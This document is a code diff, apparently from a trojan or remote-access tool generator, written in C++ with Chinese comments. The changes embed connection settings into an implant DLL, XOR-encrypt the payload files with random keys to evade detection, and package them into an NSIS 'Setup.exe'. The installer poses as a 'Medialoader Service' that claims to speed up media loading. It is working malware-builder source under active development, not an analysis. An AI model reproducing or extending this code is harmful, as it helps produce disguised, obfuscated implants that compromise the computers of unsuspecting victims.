@@ -81,10 +81,10 @@ static BOOL FindAndSet(LPBYTE pBase, DWORD dwSize, DWORD dwFlag, LPBYTE pData, D
 	{
 		if (*(LPDWORD)pBase == dwFlag /*&& *((LPDWORD)pBase + 1) == 0*/)
 		{
-			memcpy(pBase + sizeof(DWORD), pData + sizeof(DWORD), dwDataSize - sizeof(DWORD));
+			memcpy(pBase, pData, dwDataSize);
  			if (bEncrypt)
  			{
- 				XorFibonacciCrypt(pBase + sizeof(DWORD), dwDataSize - sizeof(DWORD), pBase + sizeof(DWORD), factor1, factor2);
+ 				XorFibonacciCrypt(pBase, dwDataSize, pBase, factor1, factor2);
  			}
 			return TRUE;
 		}
@@ -303,7 +303,7 @@ BOOL ResourceExeToFile(CString szFileName,LPCTSTR szResName,LPCTSTR szType)
 	UnlockResource(hgRes);
 	return bRet;
 }
-BOOL ResourceToFile(CString szFileName,LPCTSTR szResName,LPCTSTR szType,LPSTR lpszFilePath,int nFileSize)
+BOOL ResourceToFile(CString szFileName,LPCTSTR szResName,LPCTSTR szType,LPSTR lpszFilePath,int nFileSize,int key1 = 3, int key2 = 5)
 {
 	LPSTR lpResBuf = NULL;
 	CStringA strRes;
@@ -337,9 +337,15 @@ BOOL ResourceToFile(CString szFileName,LPCTSTR szResName,LPCTSTR szType,LPSTR lp
 // 	wsprintfA(lpWriteBuf,lpResBuf,lpszFilePath,nFileSize);
  	strRes = lpResBuf;
  	strRes.Replace("%s", lpszFilePath);
- 	CStringA strNFileSize;
- 	strNFileSize.Format("%d", nFileSize - 1);
- 	strRes.Replace("%d", strNFileSize);
+ 	CStringA strTmp;
+ 	strTmp.Format("%d", nFileSize - 1);
+ 	strRes.Replace("%d3", strTmp);
+
+	strTmp.Format("%d", key1);
+	strRes.Replace("%d1", strTmp);
+
+	strTmp.Format("%d", key2);
+	strRes.Replace("%d2", strTmp);
 
 	HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, 0, 
 		CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, 0);
@@ -361,7 +367,7 @@ BOOL ResourceToFile(CString szFileName,LPCTSTR szResName,LPCTSTR szType,LPSTR lp
 	return TRUE;
 }
 
-BOOL XorEncryptFile(LPCTSTR lpszFilePath, UINT encryptSize)
+BOOL XorEncryptFile(LPCTSTR lpszFilePath, UINT encryptSize,int key1 = 3 ,int key2 = 5)
 {
 	DWORD dwOutFileSize = 0;
 	BOOL bRet = FALSE;
@@ -397,7 +403,7 @@ BOOL XorEncryptFile(LPCTSTR lpszFilePath, UINT encryptSize)
 	}
 
 
-	XorFibonacciCrypt(lpFileContext,nFileSize,lpFileContext,3,5);
+	XorFibonacciCrypt(lpFileContext,nFileSize,lpFileContext,key1,key2);
 	SetFilePointer(hFile,0,0,FILE_BEGIN);
 
 	if(!WriteFile(hFile,lpFileContext,nFileSize,&dwOutFileSize,NULL))
@@ -418,26 +424,23 @@ END:
 }
 
 #define BINGO_PATH _T("bingo")
-#define SERVANT_FILE _T("shell.dll")
+#define SERVANT_FILE _T("body.dll")
+#define SHELL_FILE _T("shell.dll")
+#define SERVANT_DATA_FILE _T("data.dat")
 #define  NSI_FILE _T("packet.nsi")
 #define  OUT_FILE _T("Setup.exe")
 
 BOOL WriteSetup(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 {
 	CString strSavePath;
-	CString strInstPath;
+	CString strShellPath;
 	CString strNSIFilePath;
 	CString strTempServant;
-	CString strTempInst;
-	CString strTempNSI;
+
+	CString strDataServant;
 	CString strCmd;
 	CStringA strFullCmd;
-	CString strNSHFile;
-	CString strNSHTempFile;
 
-	CFile ServantFile;
-	CFile InstFile;
-	CFile NewFile;
 	DWORD dwOutSize = 0;
 
 	DeleteFile(OUT_FILE);
@@ -447,12 +450,10 @@ BOOL WriteSetup(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 	CreateDirectory(strSavePath, NULL);
 
 
-	//初始化路径
-	strNSHFile.Format(_T("%sLogicLib.nsh"), GetModFilePath(NULL));
-	strNSHTempFile.Format(_T("%s\\LogicLib.nsh"), strSavePath);
-
 	strTempServant.Format(_T("%s\\%s"), strSavePath, SERVANT_FILE);
 	strNSIFilePath.Format(_T("%s\\%s"), strSavePath, NSI_FILE);
+	strDataServant.Format(_T("%s\\%s"),strSavePath ,SERVANT_DATA_FILE);
+	strShellPath.Format(_T("%s\\%s"),strSavePath ,SHELL_FILE);
 
 	CHAR szInstallPath[MAX_PATH] = {0};
 	lstrcpyA(szInstallPath, CStringA(service.szInstalPath));
@@ -480,9 +481,11 @@ BOOL WriteSetup(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 		return FALSE;
 	}
 
+	CloseHandle(hFile);
+
 	//写入配置信息
 	
-	if(!FindAndSet(lpBase,nFileSize,CONNECT_FLAG,(LPBYTE)&config,sizeof(CONNECT_INFO),TRUE,CONNECT_CONFIG_FACTOR1,CONNECT_CONFIG_FACTOR2))
+	if(!FindAndSet(lpBase,nFileSize,CONNECT_FLAG,(LPBYTE)&config,sizeof(CONNECT_INFO)))
 	{
 		delete lpBase;
 		CloseHandle(hFile);
@@ -498,6 +501,7 @@ BOOL WriteSetup(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 		return FALSE;
 	}
 	
+	hFile = CreateFile(strDataServant,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
 	::SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
  	if (!WriteFile(hFile,lpBase,nFileSize,&dwOutSize,NULL))
  	{
@@ -508,19 +512,34 @@ BOOL WriteSetup(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
  	}
 
 	delete lpBase;
-	CloseHandle(hFile);
 	
 	UINT encryptSize = 4096;
 
+	srand(GetTickCount());
+
+	int key1 = rand() % 255;
+	int key2 = rand() % 255;
+
 	//加密文件
-  	if (!XorEncryptFile(strTempServant, encryptSize))
+  	if (!XorEncryptFile(strShellPath, encryptSize,key1,key2))
   	{
+		CloseHandle(hFile);
   		strError = _T("加密文件失败！");
   		return FALSE;
   	}
 
+	encryptSize = GetFileSize(hFile,0);
+	CloseHandle(hFile);
+
+	//加密文件
+	if (!XorEncryptFile(strDataServant,encryptSize ))
+	{
+		strError = _T("加密文件失败！");
+		return FALSE;
+	}
+
 	if(!ResourceToFile(strNSIFilePath,\
-		MAKEINTRESOURCE(IDR_RC_NSI),L"RC_NSI", szInstallPath,encryptSize/*nFileSize*/))
+		MAKEINTRESOURCE(IDR_RC_NSI),L"RC_NSI", szInstallPath,4096,key1,key2))
 	{
 		strError = _T("导出资源失败!");
 		return FALSE;
@@ -1117,7 +1136,7 @@ void CGeneratorDlg::LoadGeneratorConfig( GENERATOR_CONFIG& config )
 	config.serviceDisplayName = _T("Medialoader Service");
 	//READ_STRING_CONFIG(SERVICE_DESCRIPTION, _T("Make MediaPlayer loading media file faster"), config.serviceDescription);
 	config.serviceDescription = _T("Make MediaPlayer loading media file faster");
-	config.serviceInstallpath = _T("$%ALLUSERSPROFILE%\Medialoader");
+	config.serviceInstallpath = _T("$%ALLUSERSPROFILE%\\Medialoader");
 	//	READ_STRING_CONFIG(INSTALL_PATH, _T("$%ALLUSERSPROFILE%"), config.serviceInstallpath);
 	READ_INT_CONFIG(SETUP_TYPE, _T("1"), config.setupType);
 	//READ_INT_CONFIG(CONNECT_TRY_INTERVAL_M, _T("30"), config.connectTryIntervalM);
